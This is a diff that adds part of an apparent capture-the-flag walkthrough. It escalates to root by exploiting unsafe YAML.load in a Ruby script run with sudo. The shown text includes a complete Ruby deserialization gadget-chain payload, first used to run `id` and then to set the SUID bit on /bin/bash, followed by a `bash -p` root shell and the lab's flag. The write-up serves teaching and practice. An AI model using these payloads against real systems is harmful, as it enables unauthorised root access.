@@ -181,3 +181,171 @@ Traceback (most recent call last):
 /opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
 ```
 
+Now check the `dependencies.yml`.
+
+```yml
+cat /opt/update_dependencies.rb
+# Compare installed dependencies with those specified in "dependencies.yml"
+require "yaml"
+require 'rubygems'
+
+# TODO: update versions automatically
+def update_gems()
+end
+
+def list_from_file
+    YAML.load(File.read("dependencies.yml"))
+end
+
+def list_local_gems
+    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
+end
+
+gems_file = list_from_file
+gems_local = list_local_gems
+
+gems_file.each do |file_name, file_version|
+    gems_local.each do |local_name, local_version|
+        if(file_name == local_name)
+            if(file_version != local_version)
+                puts "Installed version differs from the one specified in file: " + local_name
+            else
+                puts "Installed version is equals to the one specified in file: " + local_name
+            end
+        end
+    end
+end
+```
+
+From `def list_from_file YAML.load(File.read("dependencies.yml"))` we see that it is referenced relatively, so no absolute path is specified, meaning that the program looks for the file in the current directory.
+
+We should keep in mind a security issue that is not secure to use `yaml` to load untrusted data, as this can allow malicious input to execute arbitrary code into the application.
+
+The ruby version is:
+
+```sh
+ruby -v
+ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
+```
+
+which after some search it seems to be vulnerable to the following payload:
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md
+
+```rb
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+```
+
+
+Create a file on `/tmp` named `dependencies.yml` and paste this code, and we see that the command `id` is executed.
+
+```sh
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+uid=0(root) gid=0(root) groups=0(root)
+Traceback (most recent call last):
+	33: from /opt/update_dependencies.rb:17:in `<main>'
+	32: from /opt/update_dependencies.rb:10:in `list_from_file'
+	31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
+	30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
+	29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+	28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+	27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+	26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
+	25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+	24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+	23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+	22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
+	21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
+	20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
+	19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
+	18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
+	17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
+	16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
+	15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
+	14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
+	13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
+	12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
+	11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
+	10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
+	 9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
+	 8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
+	 7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
+	 6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
+	 5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
+	 4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
+	 3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
+	 2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
+	 1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
+```
+
+Now let's set a SUID bit on the `bash` binary.
+
+To do this, replace the payload with the:
+
+```yaml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: chmod +s /bin/bash
+         method_id: :resolve
+
+```
+
+Meaning that instead of `id` we execute `chmod +s /bin/bash`.
+
+Execute it.
+
+```sh
+sudo /usr/bin/ruby /opt/update_dependencies.rb
+```
+
+Now execute bash and keep privileges.
+
+```sh
+bash -p
+```
+
+And you have root access, so now read the flag.
+
+```sh
+bash-5.1# cd /root
+bash-5.1# ls
+root.txt
+bash-5.1# cat root.txt
+19e8b043ee166c8a5e5bdb1e45cad727
+bash-5.1# 
+```
